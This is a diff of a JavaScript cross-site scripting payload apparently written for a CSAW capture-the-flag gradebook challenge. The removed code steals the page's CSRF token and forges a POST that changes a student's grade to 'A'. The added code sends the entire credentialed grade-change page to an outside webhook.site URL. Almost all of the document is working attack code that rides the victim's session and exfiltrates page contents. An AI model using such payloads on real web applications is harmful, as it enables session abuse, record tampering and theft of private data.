@@ -9,60 +9,25 @@
             new Image().src = `https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?${params.toString()}`;
         }
 
-        // Step 1: Get CSRF token from grade-change page
+        // Fetch the grade-change page and return entire DOM
         fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
             credentials: 'include'
         })
         .then(response => response.text())
         .then(html => {
-            // Extract CSRF token from HTML
-            const parser = new DOMParser();
-            const doc = parser.parseFromString(html, 'text/html');
-            const csrfToken = doc.querySelector('input[name="csrf_token"]').value;
-
-            // Send CSRF token to webhook
+            // Send entire HTML to webhook
             sendToWebhook({
-                type: 'csrf_token',
-                token: csrfToken,
-                message: 'CSRF token extracted successfully'
-            });
-
-            // Step 2: Submit grade change POST request
-            const formData = new FormData();
-            formData.append('student_id', 'cec61aee-395d-4281-af96-cfe05bda466e');
-            formData.append('class_id', 'e522382b-7643-469c-ae52-ba488f5752c6');
-            formData.append('grade', 'A');
-            formData.append('csrf_token', csrfToken);
-
-            fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
-                method: 'POST',
-                body: formData,
-                credentials: 'include'
-            })
-            .then(response => {
-                // Send success to webhook
-                sendToWebhook({
-                    type: 'post_success',
-                    status: response.status,
-                    statusText: response.statusText,
-                    message: 'Grade change POST request successful'
-                });
-            })
-            .catch(error => {
-                // Send error to webhook
-                sendToWebhook({
-                    type: 'post_error',
-                    error: error.toString(),
-                    message: 'Grade change POST request failed'
-                });
+                type: 'full_dom',
+                html: html,
+                message: 'Full DOM of grade-change page'
             });
         })
         .catch(error => {
-            // Send GET error to webhook
+            // Send error to webhook
             sendToWebhook({
-                type: 'get_error',
+                type: 'fetch_error',
                 error: error.toString(),
-                message: 'CSRF token fetch failed'
+                message: 'Failed to fetch grade-change page'
             });
         });
     </script>
